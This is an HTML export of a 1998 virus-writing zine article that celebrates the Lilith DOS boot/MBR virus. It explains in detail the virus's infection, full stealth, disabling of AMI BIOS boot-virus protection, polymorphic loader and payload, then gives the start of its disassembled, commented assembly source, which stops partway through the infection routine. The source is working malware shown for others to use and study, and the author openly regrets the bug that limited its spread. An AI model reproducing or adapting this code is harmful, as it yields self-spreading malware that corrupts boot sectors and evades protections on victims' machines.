<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                         /-----------------------------\
;                                         | Xine - issue #3 - Phile 304 |</span><span class="sc0">
</span><span class="sc1">;                                         \-----------------------------/</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                         Virus Spotlite: Lilith</span><span class="sc0">
</span><span class="sc1">;                       by b0z0/iKX,  Padania 1998</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus Name      : Lilith</span><span class="sc0">
</span><span class="sc1">; Origin          : Milan (Padania), 1995</span><span class="sc0">
</span><span class="sc1">; AV Name         : Lilith</span><span class="sc0">
</span><span class="sc1">; Type            : Boot/MBR infector, full stealth on MBR, semipoly</span><span class="sc0">
</span><span class="sc1">; Lenght          : 1536 bytes (+ variable lenght semipoly loader)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Introduction:</span><span class="sc0">
</span><span class="sc1">; ФФФФФФФФФФФФФ</span><span class="sc0">
</span><span class="sc1">;  This is a quite old but very interesting Padanian boot virus. Lilith is</span><span class="sc0">
</span><span class="sc1">; the first boot virus that implemented the 18_tech (so redirecting the int13h</span><span class="sc0">
</span><span class="sc1">; vector to a 'CD18', int 18h, opcode in ROM and then hooking int 18h. Check out</span><span class="sc0">
</span><span class="sc1">; Dandler's article in Xine#2 for everything about this method) so it is fully</span><span class="sc0">
</span><span class="sc1">; windoze compatible thus no silly messages appears at loading while the virus is</span><span class="sc0">
</span><span class="sc1">; present. Apart this Lilith many other interesting features: disables boot virus</span><span class="sc0">
</span><span class="sc1">; protection on AMI bioses, creates a semipoly loader that will load at boot time</span><span class="sc0">
</span><span class="sc1">; the real body of the virus, it's full stealth on MBR, checks if probably another</span><span class="sc0">
</span><span class="sc1">; boot virus on the target (so preventing conflicts), has a payload and other</span><span class="sc0">
</span><span class="sc1">; things. It is well coded, with clear and interesting routines.</span><span class="sc0">
</span><span class="sc1">;  It is a shame that the virus has a quite strange bug in the loader generation</span><span class="sc0">
</span><span class="sc1">; routines, since without that bug I think it should really have good chanches</span><span class="sc0">
</span><span class="sc1">; to stay in the wild (go read about its story in Dandler's article in this zine).</span><span class="sc0">
</span><span class="sc1">; The bug is not just coder's fault, but is due to some brain-damaged checks on</span><span class="sc0">
</span><span class="sc1">; some BIOSes.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; General tech aspects:</span><span class="sc0">
</span><span class="sc1">; ФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">
</span><span class="sc1">;  When the virus will get control from the mutating loader (more about this in</span><span class="sc0">
</span><span class="sc1">; the next section) it will store the original int13h vector and then get 2kbs</span><span class="sc0">
</span><span class="sc1">; of memory (by substracting from [413h]) and copy itself up there. If the</span><span class="sc0">
</span><span class="sc1">; condition for the payload activation is satisfacted (the lowest nibble of</span><span class="sc0">
</span><span class="sc1">; the timer is 1100b) then the virus will hook Int 05h (print screen). Anyway</span><span class="sc0">
</span><span class="sc1">; the virus will search for the 0cd18h in ROM (starting from 0f000h:0000)</span><span class="sc0">
</span><span class="sc1">; and then will redirect the Int 13h to the founded opcode in ROM. Also Int 18h</span><span class="sc0">
</span><span class="sc1">; will be hooked of course. After this the virus is ready to infect new floppyes,</span><span class="sc0">
</span><span class="sc1">; but before leaving the control to the old boot (or MBR) the virus will try to</span><span class="sc0">
</span><span class="sc1">; infect MBR and then load the original boot.</span><span class="sc0">
</span><span class="sc1">;  Nothing special till now, but the interesting stuff comes now. When the int</span><span class="sc0">
</span><span class="sc1">; handler will see an interesting function (read/write on boot or mbr) it will</span><span class="sc0">
</span><span class="sc1">; try to infect the victim. If the function is done on MBR then the virus will</span><span class="sc0">
</span><span class="sc1">; check if it is already infected and if so it will return the original MBR. If</span><span class="sc0">
</span><span class="sc1">; it isn't infected of course the virus will infect it. When a floppy is the</span><span class="sc0">
</span><span class="sc1">; victim the virus will check if the data in the BPB of the floppy seems</span><span class="sc0">
</span><span class="sc1">; interesting, thus bad or unformatted floppyes won't be infected. This checks</span><span class="sc0">
</span><span class="sc1">; are quite simple (comparations of the bytes per sector, sectors on disk,</span><span class="sc0">
</span><span class="sc1">; sectors on track and sides with some given stable values) but effective. Also</span><span class="sc0">
</span><span class="sc1">; the usual check for the 55aah as the last two bytes of the sector will be done.</span><span class="sc0">
</span><span class="sc1">; Another check is now done on both MBR and floppy: check for probable other boot</span><span class="sc0">
</span><span class="sc1">; virus. Lilith will search the sector for three quite usual strings founded</span><span class="sc0">
</span><span class="sc1">; in boot viruses that are:</span><span class="sc0">
</span><span class="sc1">;         mov     word ptr [413h],ax</span><span class="sc0">
</span><span class="sc1">;         dec     word ptr [413h]</span><span class="sc0">
</span><span class="sc1">;         sub     word ptr [413h],xx</span><span class="sc0">
</span><span class="sc1">; This check is quite simple, but is able to prevent some conflicts with many</span><span class="sc0">
</span><span class="sc1">; other boot viruses.</span><span class="sc0">
</span><span class="sc1">; If all the checks are ok, then the virus will calculate where to store its</span><span class="sc0">
</span><span class="sc1">; body (3 sectors) and the original boot sector on the disk. On MBR infection</span><span class="sc0">
</span><span class="sc1">; the place for this 4 sectors is stable, while isn't stable on flopppy disks.</span><span class="sc0">
</span><span class="sc1">; The virus, using the data founded in the BPB, will calculate the place for</span><span class="sc0">
</span><span class="sc1">; itself on the last four sectors of the last track on the last side of the</span><span class="sc0">
</span><span class="sc1">; floppy. With this interesting way the Lilith won't have problems with different</span><span class="sc0">
</span><span class="sc1">; floppy formats. It is very interesting that the same routine that is used to</span><span class="sc0">
</span><span class="sc1">; find the place where to place the body is also used in the restoration part of</span><span class="sc0">
</span><span class="sc1">; the virus. Infact when the virus will have to read the old boot it will have to</span><span class="sc0">
</span><span class="sc1">; recalculate the position where it stored the original boot and will use again</span><span class="sc0">
</span><span class="sc1">; the same routine (that will also check again that the boot is still intact,</span><span class="sc0">
</span><span class="sc1">; no other viruses there and so on).</span><span class="sc0">
</span><span class="sc1">; Saved the main body and original boot the virus will create the poly loader,</span><span class="sc0">
</span><span class="sc1">; that will load at the boot the body of the virus that will be placed on the</span><span class="sc0">
</span><span class="sc1">; calculated position on the disk. But I'll talk more deeply later about this</span><span class="sc0">
</span><span class="sc1">; part.</span><span class="sc0">
</span><span class="sc1">; When the loader is done to prevent warnings to the user the virus will disable</span><span class="sc0">
</span><span class="sc1">; the AMI bios boot virus protection, write the boot/mbr with the loader and then</span><span class="sc0">
</span><span class="sc1">; restore the settings of the cmos. And finally the control will be returned back</span><span class="sc0">
</span><span class="sc1">; to the interrupt caller.</span><span class="sc0">
</span><span class="sc1">; Finally some words about the payload. The virus will hook Int 05 (the print</span><span class="sc0">
</span><span class="sc1">; screen), so most likely when the user will press the PtrSc key this routine</span><span class="sc0">
</span><span class="sc1">; will be activated. The virus will set the screen to 40x25 mode, clear it</span><span class="sc0">
</span><span class="sc1">; and then display its message on given offsets on the video. When the entire</span><span class="sc0">
</span><span class="sc1">; message will be displayed its color will be changed. This will be done by</span><span class="sc0">
</span><span class="sc1">; changing the color register R/G/B components. Each color component should</span><span class="sc0">
</span><span class="sc1">; either be modified in the loop (inc or dec at each evolution) or be stable.</span><span class="sc0">
</span><span class="sc1">; This choices are done somewhat randomly.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Mutating loader generation:</span><span class="sc0">
</span><span class="sc1">; ФФФФФФФФФФФФФФФФФФФФФФФФФФФ</span><span class="sc0">
</span><span class="sc1">; The routine that creates the mutating loader that gives control to the virus is</span><span class="sc0">
</span><span class="sc1">; very interesting. What it must basically generate is the code to jump from the</span><span class="sc0">
</span><span class="sc1">; beginning of the boot (0:7c00) to the rest of the routine (skipping the BPB),</span><span class="sc0">
</span><span class="sc1">; setup the stack (so SS:SP will be 0:7c00), set the ES register to 0 (as CS and</span><span class="sc0">
</span><span class="sc1">; SS), the BX register to 7e00h, set the CX and DX registers so they point to</span><span class="sc0">
</span><span class="sc1">; the virus body stored on the floppy (MBR), set AX to a read for three sectors,</span><span class="sc0">
</span><span class="sc1">; execute and Int 13h and then jump to the loaded virus body (0:7e00h).</span><span class="sc0">
</span><span class="sc1">; Of course some things (like the CX and DX and AX assignation for the disk read)</span><span class="sc0">
</span><span class="sc1">; can be done in a random way, but some need a specific order.</span><span class="sc0">
</span><span class="sc1">; To make all this easyer the virus uses some tables with some internal</span><span class="sc0">
</span><span class="sc1">; pseudocommands. In this way when the loader creation routine will get a given</span><span class="sc0">
</span><span class="sc1">; command byte will know how can this be done. The lower nibble of the byte</span><span class="sc0">
</span><span class="sc1">; will be used as an added parameter, while the high nibble is the real command.</span><span class="sc0">
</span><span class="sc1">; Let's see the complete table of commands:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   0000b  =  0xh  = just skip</span><span class="sc0">
</span><span class="sc1">;   0001b  =  1xh  = jump directly to the value in BX</span><span class="sc0">
</span><span class="sc1">;   0010b  =  2xh  = copy CH bytes from DS:BX to ES:DI</span><span class="sc0">
</span><span class="sc1">;   0100b  =  4xh  = do all the elements of the table at DS:BX in the given order</span><span class="sc0">
</span><span class="sc1">;   1000b  =  8xh  = do just one from the table at DS:BX</span><span class="sc0">
</span><span class="sc1">;   1100b  =  Cxh  = do all the elements of the table at DS:BX in a random order</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; So what is the use of all this? When main routine (process data) will get one</span><span class="sc0">
</span><span class="sc1">; of this "commands" it will call another routine that do the given set of</span><span class="sc0">
</span><span class="sc1">; instructions. So at the very beginning the routine will get a 047h, since it</span><span class="sc0">
</span><span class="sc1">; will have to create all the 07h important stages (they are the jump, the</span><span class="sc0">
</span><span class="sc1">; initialization of AX and a cli, the stack set, the es set, the registers set</span><span class="sc0">
</span><span class="sc1">; for the read, the int13h execution and the jump to the virus). It will also be</span><span class="sc0">
</span><span class="sc1">; supplied with a table with the adresses to this 07h stages. The routine will</span><span class="sc0">
</span><span class="sc1">; get the first adress and check which command is there, that is a 82h with a</span><span class="sc0">
</span><span class="sc1">; table of two adresses. So the routine will have to select one (the 8xh command)</span><span class="sc0">
</span><span class="sc1">; of the two ways (the x2h) of creating the first jump over the BPB. Since each</span><span class="sc0">
</span><span class="sc1">; of this two adresses for the way of creating the jump point to a 1xh then the</span><span class="sc0">
</span><span class="sc1">; routine will simply jump there and so create the initial jump. Then the routine</span><span class="sc0">
</span><span class="sc1">; will pass to the second important stage. Here we have a C2h, so the routine</span><span class="sc0">
</span><span class="sc1">; will consider both the elements of the table, but in random order.</span><span class="sc0">
</span><span class="sc1">; And so on, hope you got the idea of how it works. Check out the code, is clear</span><span class="sc0">
</span><span class="sc1">; and commented enough to make a fast idea on how it works, but it is rather</span><span class="sc0">
</span><span class="sc1">; strange to describe with words :)</span><span class="sc0">
</span><span class="sc1">; In this way the routine will select (where possible) between a set of</span><span class="sc0">
</span><span class="sc1">; instructions that do some needed work (for example to make AX became zero the</span><span class="sc0">
</span><span class="sc1">; VW put 5 ways to do so) and in a random order (again, where possible... of</span><span class="sc0">
</span><span class="sc1">; course you can't first code then jump to the virus body at 0:7e00h as the</span><span class="sc0">
</span><span class="sc1">; first thing, hehe :) ).</span><span class="sc0">
</span><span class="sc1">; The routines are quite interesting, since there is some sorta internal code to</span><span class="sc0">
</span><span class="sc1">; create the loader, really fun and goodlooking code. Of course the possible</span><span class="sc0">
</span><span class="sc1">; mutations of the loader are quite limited and it should not be too difficoult</span><span class="sc0">
</span><span class="sc1">; to spot nowadays, but, again, the code is rather interesting.</span><span class="sc0">
</span><span class="sc1">; And finally to the sorta bug of the virus that is included just in the code</span><span class="sc0">
</span><span class="sc1">; generation. This isn't just a real virus bug, but rather a dummy check of the</span><span class="sc0">
</span><span class="sc1">; BIOS programmers. Infact many BIOSes when will see a a JMP SHORT (opcode 0EBh)</span><span class="sc0">
</span><span class="sc1">; as the first byte of the boot sector will check if the third byte is a NOP</span><span class="sc0">
</span><span class="sc1">; (opcode 90h). If this third byte isn't a NOP they will just stop there,</span><span class="sc0">
</span><span class="sc1">; claiming the floppy is not valid. As you can spot from the code the virus</span><span class="sc0">
</span><span class="sc1">; doens't put a NOP there, but a 00h :-( So when an infected floppy will be used</span><span class="sc0">
</span><span class="sc1">; on such a shitty BIOS, the system will just hang there :-((( Really a shame</span><span class="sc0">
</span><span class="sc1">; for such a interesting virus, really :-(</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Well, that's all, greetings to the author of the Lilith and thanx to Dandler</span><span class="sc0">
</span><span class="sc1">; for some very important hints ;)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Here comes the source, enjoy!</span><span class="sc0">


</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">
</span><span class="sc1">;лл                                                  лл</span><span class="sc0">
</span><span class="sc1">;лл                              LILITH                                  лл</span><span class="sc0">
</span><span class="sc1">;лл                        Milan, Padania, 1995                          лл</span><span class="sc0">
</span><span class="sc1">;лл                                                                      лл</span><span class="sc0">
</span><span class="sc1">;лл                         Disasm by b0z0/iKX                           лл</span><span class="sc0">
</span><span class="sc1">;лл                            Padania 1998                              лл</span><span class="sc0">
</span><span class="sc1">;лл                                                                      лл</span><span class="sc0">
</span><span class="sc1">;лллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллллл</span><span class="sc0">

</span><span class="sc5">lilith</span><span class="sc0">          </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">lilith</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">lilith</span><span class="sc0">

        </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">boot_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">load_vir</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">4bh</span><span class="sc0">     </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">load_vir</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; a sample virus loader to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; make installation faster :)</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ss</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0203h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; if you don't know what this</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0002h</span><span class="sc0">                </span><span class="sc1">; is then you don't need to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">                </span><span class="sc1">; use this ;)</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lilith_start</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">200h</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2h</span><span class="sc0">
</span><span class="sc5">boot_end</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">55h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">

</span><span class="sc1">; Virus body starts here. This is placed on three sectors of the floppy.</span><span class="sc0">
</span><span class="sc1">; This is loaded to 0:7e00h when the virus starts, while is set at offset</span><span class="sc0">
</span><span class="sc1">; 200h of the virus segment when memory is reserved.</span><span class="sc0">

</span><span class="sc5">lilith_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sti</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; reset disk</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4efh</span><span class="sc4">],</span><span class="sc12">'L'</span><span class="sc0">          </span><span class="sc1">; residency check</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">must_load</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">already_on</span><span class="sc0">
</span><span class="sc5">must_load</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">4efh</span><span class="sc4">],</span><span class="sc12">'L'</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; save orig int 13h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig13h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">orig13h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                            </span><span class="sc1">; sub 2 kbs of mem</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">413h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; get virus segment</span><span class="sc0">

                </span><span class="sc6">cli</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_timer</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                          </span><span class="sc1">; check for payload</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">                          </span><span class="sc1">; activation</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_payload</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int05h_handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">05h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">no_payload</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_cd18_rom</span><span class="sc0">                   </span><span class="sc1">; find cd18 in rom</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; point int13 to the</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">; int18 in rom</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int18h_handler</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">    </span><span class="sc1">; and hook int18</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7e00h</span><span class="sc0">                </span><span class="sc1">; copy virus from begin to</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                 </span><span class="sc1">; reserved mem starting at</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">                 </span><span class="sc1">; seg:200h</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">sti</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">reloc_back</span><span class="sc0">    </span><span class="sc1">; go running from there</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">

</span><span class="sc5">reloc_back</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                  </span><span class="sc1">; read (so infect since we</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">                 </span><span class="sc1">; already hooked int13h) mbr</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; read again boot from</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                    </span><span class="sc1">; which we were originally</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">                   </span><span class="sc1">; starting</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">error_loop0</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">error_loop0</span><span class="sc0">
</span><span class="sc5">already_on</span><span class="sc4">:</span><span class="sc0">
